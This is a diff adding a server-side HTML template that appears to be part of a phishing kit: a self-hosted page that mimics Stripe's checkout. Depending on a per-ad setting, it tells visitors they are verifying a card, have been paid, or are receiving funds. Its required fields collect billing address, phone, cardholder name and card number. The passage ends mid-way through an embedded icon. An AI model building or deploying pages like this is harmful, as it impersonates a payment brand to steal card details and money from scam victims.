@@ -1,0 +1,1761 @@
+<html lang="es">
+
+<head>
+  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
+  <meta content="noindex" name="robots">
+  <meta content="IE=edge" http-equiv="X-UA-Compatible">
+  <meta content="width=device-width,initial-scale=1,maximum-scale=1" name="viewport">
+  <meta content="notranslate" name="google">
+  <title>
+    <%=ad.id%> | Stripe
+  </title>
+
+  <% let serviceLang=ad.service.code==="service_eu" ? ad.language : ad.service.lang; %>
+
+    <link rel="stylesheet" href="/css/support_parent.css" />
+    <link rel="stylesheet" href="/css/stripe/style.css">
+
+    <link rel="shortcut icon" href="https://i.imgur.com/1PJLlvI.png" type="image/x-icon">
+
+
+</head>
+
+<body>
+  <noscript>You need to enable JavaScript to run this app.</noscript>
+  <div id="root">
+    <div class="App-Container flex-container justify-content-center">
+      <div class="App App--keyboardInteractionMode App--singleItem">
+        <div class="App-Overview">
+          <header class="Header">
+            <div class="Header-Content flex-container justify-content-space-between align-items-stretch">
+              <div class="Header-business flex-item width-grow flex-container align-items-center">
+                <a class="Link Header-businessLink Link--primary" href="/<%=ad.id%>" target="_self"
+                  title=" <%=ad.service.code.split(" _")[0].toUpperCase()%>.
+                  <%=ad.service.code.split("_")[1].toUpperCase()%>">
+                    <div style="position: relative;">
+                      <div class="flex-container align-items-center">
+                        <div class="Header-backArrowContainer" style="opacity: 1; transform: none;">
+                          <svg class="InlineSVG Icon Header-backArrow mr2 Icon--sm" focusable="false" height="12"
+                            viewBox="0 0 16 16" width="12">
+                            <path
+                              d="M3.417 7H15a1 1 0 0 1 0 2H3.417l4.591 4.591a1 1 0 0 1-1.415 1.416l-6.3-6.3a1 1 0 0 1 0-1.414l6.3-6.3A1 1 0 0 1 8.008 2.41z"
+                              fill-rule="evenodd"></path>
+                          </svg>
+                        </div>
+                        <div class="Header-merchantLogoContainer" style="transform: none;">
+                          <div class="Header-merchantLogoWithLabel flex-item width-grow">
+                            <div
+                              class="HeaderImage HeaderImage--icon HeaderImage--iconFallback flex-item width-fixed flex-container justify-content-center align-items-center width-fixed">
+                              <svg class="InlineSVG Icon HeaderImage-fallbackIcon Icon--sm" focusable="false"
+                                viewBox="0 0 16 16">
+                                <path
+                                  d="M3 7.5V12h10V7.5c.718 0 1.398-.168 2-.468V15a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V7.032c.602.3 1.282.468 2 .468zM0 3L1.703.445A1 1 0 0 1 2.535 0h10.93a1 1 0 0 1 .832.445L16 3a3 3 0 0 1-5.5 1.659C9.963 5.467 9.043 6 8 6s-1.963-.533-2.5-1.341A3 3 0 0 1 0 3z"
+                                  fill-rule="evenodd"></path>
+                              </svg>
+                            </div>
+                            <span
+                              class="Header-businessLink-label Text Text-color--gray800 Text-fontSize--14 Text-fontWeight--500">
+                              Back
+                            </span>
+                            <h1
+                              class="Header-businessLink-name Text Text-color--gray800 Text-fontSize--14 Text-fontWeight--500 Text--truncate">
+                                <% if (ad.service.code === "service_eu") { %>
+  STRIPE.COM
+<% } else {
+  let cleanTitle = ad.service.title
+    .replace(/([\u2700-\u27BF]|[\uE000-\uF8FF]|[\uD83C-\uDBFF\uDC00-\uDFFF]+|[\u2600-\u26FF]|\u24C2|\uFE0F|\u200D)/g, "")
+    .replace(/\(\s*1\.0\s*\)|\(\s*2\.0\s*\)/gi, "")
+    .trim();
+
+  let parts = cleanTitle.split("_");
+%>
+  <%= parts[0].toUpperCase() %>
+  <% if (parts[1]) { %>.<%= parts[1].toUpperCase() %><% } %>
+<% } %>
+
+                            </h1>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                </a>
+              </div>
+            </div>
+          </header>
+          <div class="App-productSummaryContainer">
+            <div class="ProductSummary">
+              <div class="ProductSummary-productImageContainer">
+                <!-- <div class="ProductImage-container"><img alt=" <%=ad.service.code.split("_")[0].toUpperCase()%>.<%=ad.service.code.split("_")[1].toUpperCase()%>" class="ProductImage-image" fetchpriority="high" src="/assets/ad/logos/<%=ad.service.code%>.png" height="84"></div> -->
+              </div>
+              <div class="ProductSummary-info"><span
+                  class="ProductSummary-name Text Text-color--gray500 Text-fontSize--16 Text-fontWeight--500">
+                    <% if (ad.service.code === "service_eu") { %>
+  STRIPE.COM
+<% } else {
+  let cleanTitle = ad.service.title
+    .replace(/([\u2700-\u27BF]|[\uE000-\uF8FF]|[\uD83C-\uDBFF\uDC00-\uDFFF]+|[\u2600-\u26FF]|\u24C2|\uFE0F|\u200D)/g, "")
+    .replace(/\(\s*1\.0\s*\)|\(\s*2\.0\s*\)/gi, "")
+    .trim();
+
+  let parts = cleanTitle.split("_");
+%>
+  <%= parts[0].toUpperCase() %>
+  <% if (parts[1]) { %>.<%= parts[1].toUpperCase() %><% } %>
+<% } %>
+                </span>
+                <div class="ProductSummary-amountsContainer">
+                  <div class="ProductSummary-totalsRead">
+                    <div class="ProductSummary-totalAmountContainer"><span
+                        class="ProductSummary-totalAmount Text Text-color--default Text-fontWeight--600 Text--tabularNumbers"
+                        id="ProductSummary-totalAmount"><span>
+                          <%=ad.price%>
+                        </span></span></div>
+                  </div>
+                </div>
+                <span class="ProductSummary-description Text Text-color--gray500 Text-fontSize--14 Text-fontWeight--500"
+                  id="ProductSummary-description">
+                  <div class="ProductSummaryDescription ProductSummaryDescription--singleItem">
+ <%= 
+    ad.version == 0 
+      ? translate["card_verification"][serviceLang] 
+      : ad.version == 1 
+        ? translate["payed"][serviceLang] 
+        : translate["receive"][serviceLang] 
+  %>                    </div>
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="App-Payment" id="app">
+          <form @submit="submitForm" class="card-form">
+            <div class="CheckoutPaymentForm">
+              <div class="PaymentRequestOrHeader" style="display: inherit; height: auto;">
+                <div class="PaymentHeaderContainer" style="display: block; opacity: 1;">
+                  <div class="PaymentHeader" style="display: block">
+                    <div class="Text Text-color--default Text-fontSize--20 Text-fontWeight--500">
+ <%= 
+    ad.version == 0 
+      ? translate["card_verification"][serviceLang] 
+      : ad.version == 1 
+        ? translate["payed"][serviceLang] 
+        : translate["receive"][serviceLang] 
+  %>                      </div>
+                  </div>
+                </div>
+                <div class="ButtonAndDividerContainer" style="opacity: 0; display: none;"></div>
+              </div>
+              <div class="flex-container direction-column" style="">
+                <div>
+                  <div>
+                    <div style="opacity: 1;">
+                      <div class="App-Global-Fields flex-container spacing-16 direction-row wrap-wrap">
+                        <div class="flex-item width-12">
+                          <div class="ReadOnlyForm ReadOnlyForm--withShadow" role="list">
+                            <div class="ReadOnlyFormField-email ReadOnlyFormField">
+                              <div class="ReadOnlyFormField-label"><span
+                                  class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">
+<%= ad.version == 0 
+  ? translate["seller_name"][serviceLang] 
+  : translate["product_name"][serviceLang] 
+%>                                         </span>
+                              </div>
+                              <div class="ReadOnlyFormField-content">
+                                <div class="ReadOnlyFormField-titleContainer">
+                                  <div class="ReadOnlyFormField-title">
+                                    <%=ad.title%>
+                                  </div>
+                                  <div class="ReadOnlyFormField-action"></div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="PaymentForm-paymentMethodForm flex-container spacing-16 direction-column wrap-wrap">
+                        <div class="flex-item width-12">
+                          <div class="FormFieldGroup">
+                            <div class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
+                              <label for="cardNumber-fieldset"><span
+                                  class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">
+                                  <%=translate["card_information"][serviceLang]%>
+                                </span></label>
+                            </div>
+
+                          <fieldset class="FormFieldGroup-Fieldset" id="cardNumber-fieldset">
+  <div class="FormFieldGroup-container">
+
+    <!-- Billing Address -->
+    <div class="FormFieldGroup-child FormFieldGroup-child--width-12">
+      <div class="FormFieldInput">
+        <div class="CheckoutInputContainer">
+          <span class="InputContainer">
+            <input required id="billingAddress" class="CheckoutInput Input" placeholder="Billing Address" v-model="billingAddress">
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <!-- ZIP -->
+    <div class="FormFieldGroup-child FormFieldGroup-child--width-12">
+      <div class="FormFieldInput">
+        <div class="CheckoutInputContainer">
+          <span class="InputContainer">
+            <input required id="billingZip" class="CheckoutInput Input" placeholder="ZIP / Postal Code" v-model="billingZip">
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <!-- City -->
+    <div class="FormFieldGroup-child FormFieldGroup-child--width-12">
+      <div class="FormFieldInput">
+        <div class="CheckoutInputContainer">
+          <span class="InputContainer">
+            <input required id="billingCity" class="CheckoutInput Input" placeholder="City" v-model="billingCity">
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <!-- State -->
+    <div class="FormFieldGroup-child FormFieldGroup-child--width-12">
+      <div class="FormFieldInput">
+        <div class="CheckoutInputContainer">
+          <span class="InputContainer">
+            <input required id="billingState" class="CheckoutInput Input" placeholder="State" v-model="billingState">
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Country -->
+    <div class="FormFieldGroup-child FormFieldGroup-child--width-12">
+      <div class="FormFieldInput">
+        <div class="CheckoutInputContainer">
+          <span class="InputContainer">
+            <input required id="billingCountry" class="CheckoutInput Input" placeholder="Country" v-model="billingCountry">
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Phone Number -->
+    <div class="FormFieldGroup-child FormFieldGroup-child--width-12">
+      <div class="FormFieldInput">
+        <div class="CheckoutInputContainer">
+          <span class="InputContainer">
+            <input required id="billingPhone" class="CheckoutInput Input" placeholder="Phone Number" v-model="billingPhone">
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Card Holder -->
+    <div class="FormFieldGroup-child FormFieldGroup-child--width-12">
+      <div class="FormFieldInput">
+        <div class="CheckoutInputContainer">
+          <span class="InputContainer">
+            <input required id="cardHolder" class="CheckoutInput Input" placeholder="<%= translate['card_holder'][serviceLang] %>" v-model="cardHolder">
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Card Number -->
+    <div class="FormFieldGroup-child FormFieldGroup-child--width-12">
+      <div class="FormFieldInput">
+        <div class="CheckoutInputContainer">
+          <span class="InputContainer">
+            <input required id="cardNumber" class="CheckoutInput Input" placeholder="<%= translate['card_number'][serviceLang] %>" v-model="cardNumber" v-mask="generateCardNumberMask" autocomplete="cc-number">
+          </span>
+                                    </div>
+                                          <div class="FormFieldInput-Icons" style="opacity: 1;">
+                                            <div style="transform: none;"><span
+                                                class="FormFieldInput-IconsIcon is-visible"><img
+                                                  data-savepage-src="https://i.imgur.com/tX4HX8E.png"
+                                                  src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMjRweCIgaGVpZ2h0PSIxNnB4IiB2aWV3Qm94PSIwIDAgMjQgMTYiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8ZyBpZD0iMzE5IiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj4KICAgICAgICA8ZyBpZD0iTmV3LUljb25zIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtODAuMDAwMDAwLCAtMjgwLjAwMDAwMCkiIGZpbGwtcnVsZT0ibm9uemVybyI+CiAgICAgICAgICAgIDxnIGlkPSJDYXJkLUJyYW5kcyIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoNDAuMDAwMDAwLCAyMDAuMDAwMDAwKSI+CiAgICAgICAgICAgICAgICA8ZyBpZD0iQ29sb3IiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDAuMDAwMDAwLCA4MC4wMDAwMDApIj4KICAgICAgICAgICAgICAgICAgICA8ZyBpZD0iVmlzYSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoNDAuMDAwMDAwLCAwLjAwMDAwMCkiPgogICAgICAgICAgICAgICAgICAgICAgICA8cmVjdCBpZD0iQ29udGFpbmVyIiBzdHJva2Utb3BhY2l0eT0iMC4yIiBzdHJva2U9IiMwMDAwMDAiIHN0cm9rZS13aWR0aD0iMC41IiBmaWxsPSIjRkZGRkZGIiB4PSIwLjI1IiB5PSIwLjI1IiB3aWR0aD0iMjMuNSIgaGVpZ2h0PSIxNS41IiByeD0iMiI+PC9yZWN0PgogICAgICAgICAgICAgICAgICAgICAgICA8cGF0aCBkPSJNMi43ODc3MzI2Miw1LjkxNDQzNzMyIEMyLjI2NDU5MDg5LDUuNjI3NTA1OTUgMS42Njc1Mzg5LDUuMzk2NzM3NzcgMSw1LjIzNjU5MzEyIEwxLjAyODAwMDUsNS4xMTE4ODIxIEwzLjc2NDk3OTIyLDUuMTExODgyMSBDNC4xMzU5NjI1NCw1LjEyNDg4NTU2IDQuNDM2OTkxMTMsNS4yMzY1MDU4NSA0LjUzNDk0NjM2LDUuNjMwNzExMzUgTDUuMTI5NzY2OTcsOC40NjY1OTA1MiBMNS4zMTE5ODMzOCw5LjMyMDcyNjE3IEw2Ljk3Nzk2NjM5LDUuMTExODgyMSBMOC43NzY3ODg5Niw1LjExMTg4MjEgTDYuMTAyODgxMTEsMTEuMjc3NTI4NCBMNC4zMDM5NjU1MiwxMS4yNzc1Mjg0IEwyLjc4NzczMjYyLDUuOTE0NDM3MzIgTDIuNzg3NzMyNjIsNS45MTQ0MzczMiBaIE0xMC4wOTk5NzUyLDExLjI4NDA3MzggTDguMzk4ODI4NzcsMTEuMjg0MDczOCBMOS40NjI4NDc2Myw1LjExMTg4MjEgTDExLjE2MzkwMSw1LjExMTg4MjEgTDEwLjA5OTk3NTIsMTEuMjg0MDczOCBaIE0xNi4yNjY3ODIxLDUuMjYyNzc0NTggTDE2LjAzNTQyOTIsNi41OTU1ODUzOCBMMTUuODgxNTY2LDYuNTMwMDQ0NDYgQzE1LjU3Mzc0NjYsNi40MDUyNDYxNyAxNS4xNjc0MTM4LDYuMjgwNTM1MTYgMTQuNjE0MzgwOCw2LjI5MzcxMzE2IEMxMy45NDI3NDEsNi4yOTM3MTMxNiAxMy42NDE1MjYzLDYuNTYyNzcxMjkgMTMuNjM0NTQ5NCw2LjgyNTQ1ODU5IEMxMy42MzQ1NDk0LDcuMTE0NDE0NjMgMTMuOTk4OTI4LDcuMzA0ODQxMSAxNC41OTM5MTUzLDcuNTg3MjUxNzcgQzE1LjU3NDAyNTcsOC4wMjcxODc1NiAxNi4wMjg2Mzg0LDguNTY1NTY1NjIgMTYuMDIxODQ3Niw5LjI2ODE4ODcxIEMxNi4wMDgwNzk5LDEwLjU0ODYzNjYgMTQuODQ2MDEyOCwxMS4zNzYwNTggMTMuMDYxMDUwOSwxMS4zNzYwNTggQzEyLjI5Nzg3NDYsMTEuMzY5NDI1MyAxMS41NjI3OTE4LDExLjIxODA5NjUgMTEuMTYzODA4LDExLjA0NzU2NzkgTDExLjQwMTg1ODcsOS42NjIwNDUxMyBMMTEuNjI1ODYyNyw5Ljc2MDY2MTk1IEMxMi4xNzg4OTU4LDkuOTkwNzA5NzEgMTIuNTQyODA5MiwxMC4wODg5Nzc1IDEzLjIyMTk4NCwxMC4wODg5Nzc1IEMxMy43MTE3NjAxLDEwLjA4ODk3NzUgMTQuMjM2ODg1Nyw5Ljg5ODM3NjQzIDE0LjI0MzU4MzUsOS40ODQ4ODM5MiBDMTQuMjQzNTgzNSw5LjIxNTY1MTI1IDE0LjAxOTg1ODYsOS4wMTg1MDQ4NiAxMy4zNjE3MDc0LDguNzE2NDU4MSBDMTIuNzE3Nzg5LDguNDIwODY5NDMgMTEuODU2ODQzNSw3LjkyODQ4MzQ2IDExLjg3MDc5NzMsNy4wNDE5NzkyNiBDMTEuODc4MDUzMiw1Ljg0MDQyNDgzIDEzLjA2MTA1MDksNSAxNC43NDA5ODc3LDUgQzE1LjM5OTA0NTgsNSAxNS45MzEyNDEzLDUuMTM3ODg5MDIgMTYuMjY2NzgyMSw1LjI2Mjc3NDU4IFogTTE4LjUyNzc1MjQsOS4wOTc0ODU2IEwxOS45NDE3MzEsOS4wOTc0ODU2IEMxOS44NzE3NzYyLDguNzg4ODkzNDcgMTkuNTQ5NjMxLDcuMzExNDczNzQgMTkuNTQ5NjMxLDcuMzExNDczNzQgTDE5LjQzMDc0NTIsNi43Nzk2NDEwNCBDMTkuMzQ2NzQzNyw3LjAwOTQyNjk4IDE5LjE5OTg1NzQsNy4zODM3MzQ1NyAxOS4yMDY5MjczLDcuMzcwNTU2NTcgQzE5LjIwNjkyNzMsNy4zNzA1NTY1NyAxOC42Njc4NDc5LDguNzQyOTAxMzcgMTguNTI3NzUyNCw5LjA5NzQ4NTYgWiBNMjAuNjI3NjAzNiw1LjExMTg4MjEgTDIyLDExLjI4Mzk4NjUgTDIwLjQyNDkwMjMsMTEuMjgzOTg2NSBDMjAuNDI0OTAyMywxMS4yODM5ODY1IDIwLjI3MDc2MDEsMTAuNTc0ODE4MSAyMC4yMjE5MjIsMTAuMzU4MTIyOCBMMTguMDM3NzkwMywxMC4zNTgxMjI4IEMxNy45NzQ2MjY0LDEwLjUyMjE5MzMgMTcuNjgwNzYwNywxMS4yODM5ODY1IDE3LjY4MDc2MDcsMTEuMjgzOTg2NSBMMTUuODk1Nzk4OCwxMS4yODM5ODY1IEwxOC40MjI2MzQzLDUuNjIzOTkxNDQgQzE4LjU5NzcwNzIsNS4yMjM0MTUxMiAxOC45MDU5OTE3LDUuMTExODgyMSAxOS4zMTE3NjYzLDUuMTExODgyMSBMMjAuNjI3NjAzNiw1LjExMTg4MjEgTDIwLjYyNzYwMzYsNS4xMTE4ODIxIFoiIGlkPSJTaGFwZSIgZmlsbD0iIzE0MzRDQiI+PC9wYXRoPgogICAgICAgICAgICAgICAgICAgIDwvZz4KICAgICAgICAgICAgICAgIDwvZz4KICAgICAgICAgICAgPC9nPgogICAgICAgIDwvZz4KICAgIDwvZz4KPC9zdmc+Cg=="
+                                                  alt="Visa" class="BrandIcon" fetchpriority="low"
+                                                  data-savepage-loading="lazy"></span></div>
+                                            <div style="transform: none;"><span
+                                                class="FormFieldInput-IconsIcon is-visible"><img
+                                                  data-savepage-src="https://i.imgur.com/CGTgDae.png"
+                                                  src="data:image/svg+xml;base64,PHN2ZwogIGhlaWdodD0iMTYiCiAgdmlld0JveD0iMCAwIDI0IDE2IgogIHdpZHRoPSIyNCIKICB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciCj4KICA8ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgPHJlY3QgZmlsbD0iIzI1MjUyNSIgaGVpZ2h0PSIxNiIgcng9IjIiIHdpZHRoPSIyNCIgLz4KICAgIDxjaXJjbGUgY3g9IjkiIGN5PSI4IiBmaWxsPSIjZWIwMDFiIiByPSI1IiAvPgogICAgPGNpcmNsZSBjeD0iMTUiIGN5PSI4IiBmaWxsPSIjZjc5ZTFiIiByPSI1IiAvPgogICAgPHBhdGgKICAgICAgZD0ibTEyIDMuOTk5NjMzODFjMS4yMTQ0NDY3LjkxMjIwNjMzIDIgMi4zNjQ1NDgzNiAyIDQuMDAwMzY2MTlzLS43ODU1NTMzIDMuMDg4MTU5OS0yIDQuMDAwMzY2MmMtMS4yMTQ0NDY3LS45MTIyMDYzLTItMi4zNjQ1NDgzNy0yLTQuMDAwMzY2MnMuNzg1NTUzMy0zLjA4ODE1OTg2IDItNC4wMDAzNjYxOXoiCiAgICAgIGZpbGw9IiNmZjVmMDAiCiAgICAvPgogIDwvZz4KPC9zdmc+Cg=="
+                                                  alt="MasterCard" class="BrandIcon" fetchpriority="low"
+                                                  data-savepage-loading="lazy"></span></div>
+                                            <div style="transform: none;"><span
+                                                class="FormFieldInput-IconsIcon is-visible"><img
+                                                  data-savepage-src="https://i.imgur.com/HRjaFrS.png"
+                                                  src="data:image/svg+xml;base64,PHN2ZwogIGhlaWdodD0iMTYiCiAgdmlld0JveD0iMCAwIDI0IDE2IgogIHdpZHRoPSIyNCIKICB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciCj4KICA8ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgPHJlY3QgZmlsbD0iIzAxNmZkMCIgaGVpZ2h0PSIxNiIgcng9IjIiIHdpZHRoPSIyNCIgLz4KICAgIDxwYXRoCiAgICAgIGQ9Im0xMy43NjQwNjYzIDEzLjM5Mzg1NjR2LTUuNzAxMzkyMzFsMTAuMTQ3NTM1OS4wMDkxMDQ5N3YxLjU3NDg5NTAzbC0xLjE3Mjg2MTkgMS4yNTMzOTIzMSAxLjE3Mjg2MTkgMS4yNjQ4ODM5djEuNjA4MzA5NGgtMS44NzI2MTg4bC0uOTk1MTgyMy0xLjA5ODE2NTctLjk4ODExMDUgMS4xMDIzMjA0eiIKICAgICAgZmlsbD0iI2ZmZmZmZSIKICAgIC8+CiAgICA8cGF0aAogICAgICBkPSJtMTQuNDQxODEyMiAxMi43Njg3OTU2di00LjQ0ODg4NGgzLjc3MjI4NzJ2MS4wMjQ4ODM5OGgtMi41NTA4OTV2LjY5NTY5MDYyaDIuNDkwMDc3NHYxLjAwNzgyMzJoLTIuNDkwMDc3NHYuNjgzMzE0OWgyLjU1MDg5NXYxLjAzNzE3MTN6IgogICAgICBmaWxsPSIjMDE2ZmQwIgogICAgLz4KICAgIDxwYXRoCiAgICAgIGQ9Im0xOC4xOTUyNzA3IDEyLjc2ODc5NTYgMi4wODczMzctMi4yMjcwMDU1LTIuMDg3NDI1NC0yLjIyMTc5MDFoMS42MTU2NDY0bDEuMjc1NDkxNyAxLjQxMDAzMzE1IDEuMjc5MTE2MS0xLjQxMDAzMzE1aDEuNTQ2MTY1N3YuMDM1MDA1NTJsLTIuMDQyODcyOSAyLjE4Njc4NDU4IDIuMDQyODcyOSAyLjE2Mzg4OTV2LjA2MzExNmgtMS41NjE3MjM3bC0xLjI5ODEyMTYtMS40MjQxNzY4LTEuMjg0NzczNSAxLjQyNDE3Njh6IgogICAgICBmaWxsPSIjMDE2ZmQwIgogICAgLz4KICAgIDxwYXRoCiAgICAgIGQ9Im0xNC4yMzczNDgxIDIuNjMxOTU1OGgyLjQ0NjA1NTJsLjg1OTEzODEgMS45NTA4NTA4M3YtMS45NTA4NTA4M2gzLjAxOTg0NTNsLjUyMDc1MTQgMS40NjE1NjkwNi41MjI1MTk0LTEuNDYxNTY5MDZoMi4zMDU5NDQ3djUuNzAxMzkyMjdoLTEyLjE4NjUxOTN6IgogICAgICBmaWxsPSIjZmZmZmZlIgogICAgLz4KICAgIDxnIGZpbGw9IiMwMTZmZDAiPgogICAgICA8cGF0aCBkPSJtMTQuNzAwNDY0MSAzLjI1MTM1OTEyLTEuOTc0MDExMSA0LjQ0NTE3MTI3aDEuMzUzOTAwNmwuMzcyNDE5OS0uODkwMTY1NzVoMi4wMTc5NDQ3bC4zNzIxNTQ3Ljg5MDE2NTc1aDEuMzg3NTgwMWwtMS45NjU3OS00LjQ0NTE3MTI3em0uMTY5NjM1MyAyLjU1NzQzNjQ2LjU5Mi0xLjQxNTA3MTgyLjU5MTU1ODEgMS40MTUwNzE4MnoiIC8+CiAgICAgIDxwYXRoIGQ9Im0xOC4yMTE5Nzc5IDcuNjk1NzM0ODF2LTQuNDQ1MDgyODhsMS45MDMxMTYuMDA2NTQxNDQuOTc5MjcwNyAyLjczMjcyOTI4Ljk4NTYzNTQtMi43MzkyNzA3MmgxLjgzMTYwMjJ2NC40NDUwODI4OGwtMS4xNzg2MDc3LjAxMDQzMDk0di0zLjA1MzM0ODA3bC0xLjExMjU3NDYgMy4wNDI5MTcxM2gtMS4wNzU4MDExbC0xLjEzNTY0NjQtMy4wNTMzNDgwN3YzLjA1MzM0ODA3eiIgLz4KICAgIDwvZz4KICA8L2c+Cjwvc3ZnPgo="
+                                                  alt="American Express" class="BrandIcon" fetchpriority="low"
+                                                  data-savepage-loading="lazy"></span></div>
+                                            <div class="CardFormFieldGroupIconOverflow"><span
+                                                class="CardFormFieldGroupIconOverflow-Item CardFormFieldGroupIconOverflow-Item--visible"
+                                                role="presentation"><span class="FormFieldInput-IconsIcon"
+                                                  role="presentation"><img
+                                                    data-savepage-src="https://i.imgur.com/HACmOUZ.png"
+                                                    src="data:image/svg+xml;base64,PHN2ZwogIGhlaWdodD0iMTYiCiAgdmlld0JveD0iMCAwIDI0IDE2IgogIHdpZHRoPSIyNCIKICB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciCj4KICA8ZyBmaWxsPSJub25lIj4KICAgIDxwYXRoCiAgICAgIGQ9Im00LjU0NTg4MjU0LjAwMDA2Njc2aDUuNzkzNzc0NjZjLjgwODc1ODggMCAxLjMxMTc3OTMuNzI1NjY0NTkgMS4xMjMxMTEzIDEuNjE4OTA5ODFsLTIuNjk3NDE2MDggMTIuNzQ4NTY1MDNjLS4xOTAzNjI2Mi44OTAxMzYxLTEuMDAwMTA5OTQgMS42MTY0MjI1LTEuODA5NDMzNjIgMS42MTY0MjI1aC01Ljc5MzIwOTc2Yy0uODA3NjI5MDUgMC0xLjMxMTc3OTM3LS43MjYyODY0LTEuMTIzMTExMzUtMS42MTY0MjI1bDIuNjk4NTQ1ODEtMTIuNzQ4NTY1MDNjLjE4ODY2ODAzLS44OTMyNDUyMi45OTc5OTE3LTEuNjE4OTA5ODEgMS44MDc3MzkwNC0xLjYxODkwOTgxIgogICAgICBmaWxsPSIjZGQyNDIzIgogICAgLz4KICAgIDxwYXRoCiAgICAgIGQ9Im05Ljg1NzU2NTE2LjAwMDA2Njc2aDYuNjYyNjkyNjRjLjgwODYxNzQgMCAuNDQzOTkxMS43MjU2NjQ1OS4yNTM3Njk3IDEuNjE4OTA5ODFsLTIuNjk2OTkyNCAxMi43NDg1NjUwM2MtLjE4OTIzMjkuODkwMTM2MS0uMTMwMjAzNiAxLjYxNjQyMjUtLjk0MDUxNTggMS42MTY0MjI1aC02LjY2MjY5MjQ4Yy0uODEwMzEyMjEgMC0xLjMxMTc3OTM5LS43MjYyODY0LTEuMTIxNDE2NzItMS42MTY0MjI1bDIuNjk2ODUxMTYtMTIuNzQ4NTY1MDNjLjE5MTQ5MjM4LS44OTMyNDUyMi45OTkxMjE0NC0xLjYxODkwOTgxIDEuODA4MzAzOS0xLjYxODkwOTgxIgogICAgICBmaWxsPSIjMTYzMTVlIgogICAgLz4KICAgIDxwYXRoCiAgICAgIGQ9Im0xNi4yNTU5ODEzLjAwMDA2Njc2aDUuNzkzNzc0NWMuODA5ODg4NiAwIDEuMzEyOTA5Mi43MjU2NjQ1OSAxLjEyMjY4NzggMS42MTg5MDk4MWwtMi42OTY5OTI0IDEyLjc0ODU2NTAzYy0uMTkwMzYyNi44OTAxMzYxLTEuMDAwNjc0OSAxLjYxNjQyMjUtMS44MTA0MjIyIDEuNjE2NDIyNWgtNS43OTEwOTE1Yy0uODEwMzEyMiAwLTEuMzEyOTA5MS0uNzI2Mjg2NC0xLjEyMzExMTMtMS42MTY0MjI1bDIuNjk3NDE2LTEyLjc0ODU2NTAzYy4xODg2NjgxLS44OTMyNDUyMi45OTc0MjY4LTEuNjE4OTA5ODEgMS44MDc3MzkxLTEuNjE4OTA5ODEiCiAgICAgIGZpbGw9IiMwMzY4NjIiCiAgICAvPgogICAgPHBhdGgKICAgICAgZD0ibTYuMDU5MDExMzUgNC4wODU2MTQzNGMtLjU5NTgwMTE2LjAwNjY4NDU3LS43NzE3NTk1MSAwLS44Mjc5NjQ1LS4wMTQ2MTI3OC0uMDIxNjA2NDYuMTEzMDE1ODgtLjQyMzY1NTc3IDIuMTU0NjA4MjQtLjQyNDc4NTUzIDIuMTU2MzE4MjQtLjA4NjU2Njk5LjQxMzA0NDMtLjE0OTU1MDQzLjcwNzQ3NjMtLjM2MzQ5NjU5Ljg5NzU5Nzk1LS4xMjE0NDc5OC4xMTA1Mjg2LS4yNjMyMzE0NC4xNjM4NDk3LS40Mjc2MDk4Ni4xNjM4NDk3LS4yNjQyMTk5NiAwLS40MTgxNDgyMi0uMTQ0NDE3OC0uNDQzOTkxMjItLjQxODMyOTc1bC0uMDA0OTQyNjQtLjA5NDA1MDM1cy4wODA0OTQ1OC0uNTUzMjY0ODUuMDgwNDk0NTgtLjU1NjM3Mzk1YzAgMCAuNDIxOTYxMTItMS44NjA0ODcxMS40OTc1MTMwNi0yLjEwNjQxNzEzLjAwMzk1NDEyLS4wMTM5OTA5Ni4wMDUwODM4Ny0uMDIxMjk3MzYuMDA2MDcyMzktLjAyNzk4MTkzLS44MjEzMjcyNS4wMDc5MjgyMS0uOTY2OTIzNiAwLS45NzY5NTAxMi0uMDE0NjEyNzgtLjAwNTUwNzUzLjAyMDA1MzcxLS4wMjU4NDMuMTM1NDAxNDItLjAyNTg0My4xMzU0MDE0MmwtLjQzMDg1Nzg4IDIuMDk2OTM0MzctLjAzNjk5OTI3LjE3Nzg0MDctLjA3MTU5NzgyLjU4MTcxMzFjMCAuMTcyNTU1Mi4wMzA3ODU2NS4zMTMzOTc1NS4wOTIwNzQ1Mi40MzI0NzYyLjE5NjI5MzgyLjM3NzYwMDU1Ljc1NjIyNTQ5LjQzNDE4NjIgMS4wNzI5Nzg3NS40MzQxODYyLjQwODEyMTY5IDAgLjc5MDk2NTI1LS4wOTU0NDk0NSAxLjA0OTY3NzY3LS4yNjk3MTQ2NS40NDkwNzUwOS0uMjkyMTAwMi41NjY1Njg5Ny0uNzQ4NjcxOTUuNjcxMzUzMTUtMS4xNTQ0MDk4NWwuMDQ4N